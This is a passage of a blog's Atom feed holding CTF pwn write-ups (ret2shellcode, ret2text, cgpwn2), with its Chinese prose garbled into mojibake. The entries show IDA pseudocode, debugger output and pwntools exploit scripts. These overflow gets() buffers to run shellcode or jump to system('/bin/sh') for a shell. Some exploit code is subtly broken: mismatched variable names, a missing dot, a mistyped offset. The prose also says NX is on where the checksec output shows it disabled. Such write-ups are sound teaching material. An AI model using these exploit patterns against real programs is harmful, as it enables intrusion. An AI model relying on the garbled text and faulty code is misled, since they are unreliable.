<p>å¾ˆæ˜æ˜¾è·Ÿret2textä¸€æ · æœ‰getsï¼ˆï¼‰å‡½æ•°å’Œstrncpyå‡½æ•°ï¼Œgetså‡½æ•°æ˜¯ä¸é™åˆ¶è¾“å…¥å†…å®¹ï¼Œä»…æ”¶åˆ°å›è½¦åç»“æŸï¼Œå³æœ‰æº¢å‡º                                  //getsï¼ˆï¼‰ï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥'\x00'<br>
æˆ‘ä»¬å…ˆæ‰¾buf2çš„åœ°å€ä½œä¸ºshellcode åœ°å€   åœ¨ida32å¾ˆå®¹æ˜“å‘ç°</p>
]]></summary>
        <content type="html"><![CDATA[<p>shellcodeåŸç†å°±æ˜¯è®©ç¨‹åºä¸­æŸä¸ªå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œè¿”å›åˆ°shellcodeçš„åœ°å€å»æ‰§è¡Œshellcodeï¼Œç›®çš„æ˜¯ä¸ºäº†è·å–shellï¼Œshellcodeæ˜¯æ ˆæº¢å‡ºä¸­ä¸€ç§ç®€å•ä¸”å¸¸è§„çš„æ“ä½œï¼Œéœ€è¦é…åˆropç­‰æŠ€æœ¯ä¸€èµ·ä½¿ç”¨ã€‚<br>
ret2shellcodeé¢˜å‹å–ret2textå·®ä¸å¤šï¼Œä½†ret2shellcodeæ²¡æœ‰/bin/sh åé—¨ç›´æ¥åˆ©ç”¨çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è‡ªå·±æ„é€ shellcodeã€‚<br>
shellcodeï¼ˆæŒ‡ä»¤ä¸º:shellcode = asm(shellcraft.sh())ï¼‰<br>
é¢˜ç›®ret2shellcodeï¼Œåšé¢˜å‰éœ€è¦checksecä¸€ä¸‹æœ‰ä»€ä¹ˆä¿æŠ¤ä»¥åŠæ˜¯å¤šå°‘ä½çš„ç¨‹åº</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>åœ¨è¿™é‡Œå‘ç°æ˜¯32ä½ç¨‹åºè€Œä¸”å¼€äº†NXä¿æŠ¤æ‰“å¼€IDA32æŒ‰F5è¿›å…¥mainå‡½æ•°ä¼ªä»£ç </p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>å¾ˆæ˜æ˜¾è·Ÿret2textä¸€æ · æœ‰getsï¼ˆï¼‰å‡½æ•°å’Œstrncpyå‡½æ•°ï¼Œgetså‡½æ•°æ˜¯ä¸é™åˆ¶è¾“å…¥å†…å®¹ï¼Œä»…æ”¶åˆ°å›è½¦åç»“æŸï¼Œå³æœ‰æº¢å‡º                                  //getsï¼ˆï¼‰ï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥'\x00'<br>
æˆ‘ä»¬å…ˆæ‰¾buf2çš„åœ°å€ä½œä¸ºshellcode åœ°å€   åœ¨ida32å¾ˆå®¹æ˜“å‘ç°</p>
<!-- more -->
<p>.bss:0804A080    buf2            db 64h dup(?)           ;</p>
<!-- more -->
<p>ç„¶åç¡®å®šæ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„ä½ç½®ï¼Œå¯ä»¥æ‰‹åŠ¨è®¡ç®—ï¼Œè¿™é‡Œä½¿ç”¨cyclicï¼›<br>
cyclic patternæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„åŠŸèƒ½ï¼Œpatternå°±æ˜¯æŒ‡ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åœ¨å®Œæˆæº¢å‡ºé¢˜ç›®æ—¶ï¼Œä½¿ç”¨cyclic patternå¯ä»¥å¤§å¤§å‡å°‘è®¡ç®—æº¢å‡ºç‚¹çš„æ—¶é—´ã€‚<br>
<img src="https://cc-nianchu.github.io/post-images/1626265826546.png" alt="" loading="lazy"><br>
å¯ä»¥å‘ç°åœ¨0x62616164ä¸­æº¢å‡º<br>
è¾“å…¥cyclic -l 0x0626164  å¯ä»¥å¾—åˆ°åç§»é‡ä¸º112<br>
å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payload<br>
payload=shellcode.ljust(112,'a')+p32ï¼ˆ0x0804A080)<br>
EXPå¦‚ä¸‹</p>
<pre><code>from pwn import *

q = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
q.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ„é€ åŸºæœ¬rop]]></title>
        <id>https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/</id>
        <link href="https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/">
        </link>
        <updated>2021-07-14T00:55:46.000Z</updated>
        <summary type="html"><![CDATA[<pre><code> èƒ½æ„é€ ropçš„é¢˜ç›®å¾—æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼š
        ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚
        å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚
</code></pre>
<p>å¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚ğŸ˜³</p>
<h2 id="ret2text">ret2text</h2>
<p>ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROP;<br>
åšé¢˜ç›®å‰é¦–å…ˆå¾—æŸ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶</p>
]]></summary>
        <content type="html"><![CDATA[<pre><code> èƒ½æ„é€ ropçš„é¢˜ç›®å¾—æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼š
        ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚
        å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚
</code></pre>
<p>å¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚ğŸ˜³</p>
<h2 id="ret2text">ret2text</h2>
<p>ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROP;<br>
åšé¢˜ç›®å‰é¦–å…ˆå¾—æŸ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶</p>
<!-- more -->
<p>Arch:     i386-32-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x8048000)</p>
<!-- more -->
<p>å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºè¿™æ˜¯32ä½ç¨‹åºï¼Œåªå¼€äº†NXä¿æŠ¤<br>
æˆ‘ä»¬ç”¨ida32æ‰“å¼€æ–‡ä»¶   æŒ‰F5è¿›å…¥mainå‡½æ•°</p>
<!-- more -->
<p>int __cdecl main(int argc, const char **argv, const char **envp)<br>
{<br>
char s[100]; // [esp+1Ch] [ebp-64h] BYREF</p>
<p>setvbuf(stdout, 0, 2, 0);<br>
setvbuf(_bss_start, 0, 1, 0);<br>
puts(&quot;There is something amazing here, do you know anything?&quot;);<br>
gets(s);<br>
printf(&quot;Maybe I will tell you next time !&quot;);<br>
return 0;<br>
}</p>
<!-- more -->
<p>å‘ç°getsï¼ˆï¼‰å‡½æ•°ï¼Œgetsæ˜¯ä¸é™åˆ¶è¾“å…¥å†…å®¹ï¼Œä»…æ”¶åˆ°å›è½¦åç»“æŸ //getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥'\x00'<br>
å†æŸ¥çœ‹å…¶ä»–å‡½æ•°å‘ç°/bin/sh          //ç»å…¸åé¢å‡½æ•°ç›´æ¥è¿›å…¥ç³»ç»Ÿ</p>
<!-- more -->
<p>void secure()<br>
{<br>
unsigned int v0; // eax<br>
int input; // [esp+18h] [ebp-10h] BYREF<br>
int secretcode; // [esp+1Ch] [ebp-Ch]</p>
<p>v0 = time(0);<br>
srand(v0);<br>
secretcode = rand();<br>
__isoc99_scanf((int)&amp;unk_8048760, (int)&amp;input);<br>
if ( input == secretcode )<br>
system(&quot;/bin/sh&quot;);<br>
}</p>
<!-- more -->
<p>å†idaæ‰¾åˆ°/bin/shçš„åœ°å€</p>
<!-- more -->
<p>.text:080485FD                 push    ebp<br>
.text:080485FE                 mov     ebp, esp<br>
.text:08048600                 sub     esp, 28h<br>
.text:08048603                 mov     dword ptr [esp], 0 ; timer<br>
.text:0804860A                 call    _time<br>
.text:0804860F                 mov     [esp], eax      ; seed<br>
.text:08048612                 call    _srand<br>
.text:08048617                 call    _rand<br>
.text:0804861C                 mov     [ebp+secretcode], eax<br>
.text:0804861F                 lea     eax, [ebp+input]<br>
.text:08048622                 mov     [esp+4], eax<br>
.text:08048626                 mov     dword ptr [esp], offset unk_8048760<br>
.text:0804862D                 call    ___isoc99_scanf<br>
.text:08048632                 mov     eax, [ebp+input]<br>
.text:08048635                 cmp     eax, [ebp+secretcode]<br>
.text:08048638                 jnz     short locret_8048646<br>
.text:0804863A                mov  dword ptr [esp], offset command ; &quot;/ bin/sh<br>
.text:08048641                 call    _system</p>
<!-- more -->
<p>å‘ç°/bin/shåœ°å€åœ¨0x0804863A,è¿™æ˜¯bin_str=0x0804863Aï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç›´æ¥æ§åˆ¶ç¨‹åºè¿”å›è‡³ 0x0804863A<br>
ä¸‹é¢å°±æ˜¯æˆ‘ä»¬å¦‚ä½•æ„é€  payload äº†ï¼Œä»getså¼€å§‹å¯»æ‰¾</p>
<!-- more -->
<p>.text:080486A7                 lea     eax, [esp+1Ch]<br>
.text:080486AB                 mov     [esp], eax      ; s<br>
.text:080486AE                 call    _gets</p>
<!-- more -->
<p>åˆ©ç”¨gdbæ¥æ‰“æ–­ç‚¹</p>
<!-- more -->
<p>pwndbg&gt; b *0x080486AE<br>
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.<br>
pwndbg&gt; r<br>
Starting program: /home/nianchu/Desktop/æ–°æ‰‹è®­ç»ƒ/ret2text<br>
There is something amazing here, do you know anything?</p>
<p>Breakpoint 1, 0x080486ae in main () at ret2text.c:24<br>
24	ret2text.c: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•.<br>
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>
EAX  0xffffcefc â€”â–¸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x26f34<br>
EBX  0x0<br>
ECX  0xf7fb7dc7 (<em>IO_2_1_stdout</em>+71) â—‚â€” 0xfb88900a<br>
EDX  0xf7fb8890 (_IO_stdfile_1_lock) â—‚â€” 0x0<br>
EDI  0x0<br>
ESI  0xf7fb7000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x1d7d8c<br>
EBP  0xffffcf68 â—‚â€” 0x0<br>
ESP  0xffffcee0 â€”â–¸ 0xffffcefc â€”â–¸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x26f34<br>
EIP  0x80486ae (main+102) â€”â–¸ 0xfffdade8 â—‚â€” 0xfffdade8</p>
<!-- more -->
<p>ä»ESPå¯ä»¥å‘ç°åœ¨espä¸º0xffffcee0ï¼Œebpä¸º0xffffcf68,sä¸º0xffffcefc<br>
Â·Â·Â·Â·Â·Â·Â·Â·Â·s ç›¸å¯¹äº ebp çš„åç§»ä¸º 0x6c<br>
Â·Â·Â·Â·Â·Â·Â·Â·Â·s ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»ä¸º 0x6c+4<br>
æœ€åpayloadæ„é€ å¦‚ä¸‹ï¼š</p>
<!-- more -->
<p>from pwn import*</p>
<p>q=process('./ret2text')<br>
bin_str=0x0804863A<br>
payload='a'*(0x6c+4)+p32(bin_str)<br>
q.sendline(payload)<br>
q.interactive()</p>
<!-- more -->
<h2 id="cgpwn2">cgpwn2</h2>
<p>è¿™é“é¢˜åœ¨æ”»é˜²ä¸–ç•Œçš„æ–°æ‰‹é¢˜ï¼Œæ‹¿åˆ°é¢˜ç›®å…ˆchecksecä¸€ä¸‹</p>
<pre><code>Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>ç„¶åæ‰“å¼€ida32ä½f5è·å¾—ä¼ªä»£ç </p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  hello();
  puts(&quot;thank you&quot;);
  return 0;
}
</code></pre>
<p>å¯ä»¥å‘ç°mainå‡½æ•°é‡Œé¢å•¥éƒ½æ²¡æœ‰ï¼Œåªæœ‰3ä¸ªç¼“å†²åŒºå’Œæœ‰ä¸ªhello()å‡½æ•°ï¼Œç»§ç»­æ‰“å¼€çœ‹çœ‹</p>
<pre><code>char *hello()
{
  __int16 *v0; // eax
  int v1; // ebx
  unsigned int v2; // ecx
  __int16 *v3; // eax
  __int16 s; // [esp+12h] [ebp-26h] BYREF
  int v6; // [esp+14h] [ebp-24h] BYREF

  v0 = &amp;s;
  v1 = 30;
  if ( ((unsigned __int8)&amp;s &amp; 2) != 0 )
  {
    s = 0;
    v0 = (__int16 *)&amp;v6;
    v1 = 28;
  }
  v2 = 0;
  do
  {
    *(_DWORD *)&amp;v0[v2 / 2] = 0;
    v2 += 4;
  }
  while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );
  v3 = &amp;v0[v2 / 2];
  if ( (v1 &amp; 2) != 0 )
    *v3++ = 0;
  if ( (v1 &amp; 1) != 0 )
    *(_BYTE *)v3 = 0;
  puts(&quot;please tell me your name&quot;);
  fgets(name, 50, stdin);
  puts(&quot;hello,you can leave some message here:&quot;);
  return gets((char *)&amp;s);
}
</code></pre>
<p>å‰é¢çœ‹ä¸æ‡‚æ²¡ä»€ä¹ˆå…³ç³»ï¼Œä¸»è¦çœ‹åˆ°åé¢æœ‰</p>
<pre><code>puts(&quot;please tell me your name&quot;);
  fgets(name, 50, stdin);
  puts(&quot;hello,you can leave some message here:&quot;);
  return gets((char *)&amp;s);
</code></pre>
<p>ä»gets()å‡½æ•°å¯ä»¥nameé‚£é‡Œå¯ä»¥çœ‹å‡ºè¿™é‡Œå¯ä»¥æ ˆæº¢å‡ºç„¶åå†™å…¥æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿<br>
åœ¨å‡½æ•°åˆ—è¡¨çœ‹åˆ°ä¸€ä¸ªpwnå‡½æ•°ï¼Œæ‰“å¼€å¾—</p>
<pre><code>int pwn()
{
  return system(&quot;echo hehehe&quot;);
}
</code></pre>
<p>mainå‡½æ•°å’Œhelloå‡½æ•°é‡Œé¢éƒ½æ²¡æœ‰ä»–ï¼Œè€Œä¸”è¿™ä¸ªå‡½æ•°æ˜¯æ‰“å°heheheä½†æ˜¯å¯ä»¥è·å¾—systemå‡½æ•°ï¼Œ<br>
å› æ­¤æˆ‘ä»¬å…ˆé€šè¿‡æ ˆæº¢å‡ºå°†å¼•ç”¨pwnå‡½æ•°å†å°†é‡Œé¢çš„echo heheheæ”¹æˆ/bin/sh<br>
æ€è·¯æ¸…æ™°äº†ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡idaæ‰¾åˆ°call systemå‡½æ•°çš„åœ°å€ï¼Œå†æ‰¾nameçš„åœ°å€<br>
å†æ‰¾sçš„åç§»é‡<br>
å…ˆé€šè¿‡shift+f4æ‰¾åˆ°pwnå‡½æ•°åœ°å€ï¼ŒåŒå‡»pwnå‡½æ•°<br>
<img src="https://cc-nianchu.github.io/post-images/1626536255632.png" alt="" loading="lazy"><br>
<img src="https://cc-nianchu.github.io/post-images/1626536266388.png" alt="" loading="lazy"><br>
åœ¨è¿™é‡Œå¯ä»¥å‘ç°sys_addr=0x0804855A<br>
åœ¨helloå‡½æ•°é‡Œå¯ä»¥å‘ç° name_addr=0x0804A080,sçš„åç§»é‡ä¸º24<br>
æˆ‘ä»¬è¦è¿è¡Œsystem(/bin/sh)å› æ­¤æˆ‘ä»¬è¦è¾“å…¥/bin/shåˆ°sys_addrä¸Š<br>
exp:</p>
<pre><code>from pwn import *
q = remote('ip',ç«¯å£)
sys_addr = 0x804855A
name_addr = 0x804A080
payload = 'a' * 0x26 + 'bbbb' + p32(sys_addr) + p32(name_addr)
q = r.recvuntil('please tell me your name')
q.sendline('/bin/sh')
q = r.recvuntil('hello,you can leave some message here:')
q.sendline(payload)
q.interactive()
</code></pre>
]]></content>
    </entry>
</feed>